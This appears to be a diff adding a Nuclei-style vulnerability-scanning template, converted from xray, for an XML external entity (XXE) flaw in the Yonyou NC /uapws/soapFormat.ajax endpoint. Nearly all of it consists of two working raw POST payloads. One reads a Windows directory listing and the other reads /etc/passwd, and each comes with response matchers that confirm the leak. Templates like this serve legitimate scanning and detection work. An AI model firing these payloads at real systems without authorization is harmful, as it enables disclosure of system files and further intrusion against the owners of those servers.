@@ -1,0 +1,48 @@
+id: poc-yaml-yonyou-nc-xxe
+
+info:
+  name: poc-yaml-yonyou-nc-xxe
+  author: xiaobaicai
+  severity: high
+  tags: xray-converted,xxe,ct-469737
+  reference:
+    - https://github.com/Str1am/OAScan/blob/main/Script/Yongyou_soapFormat_Read.py
+
+http:
+  - raw:
+      - |
+        POST /uapws/soapFormat.ajax HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:///c:/windows/"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "soap:ServerADFS"
+          - "appcompat"
+          - "win.ini"
+          - "explorer.exe"
+  - raw:
+      - |
+        POST /uapws/soapFormat.ajax HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:////etc/passwd"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "root:[^:]*:[0-9]*:[0-9]*:[^:]*"
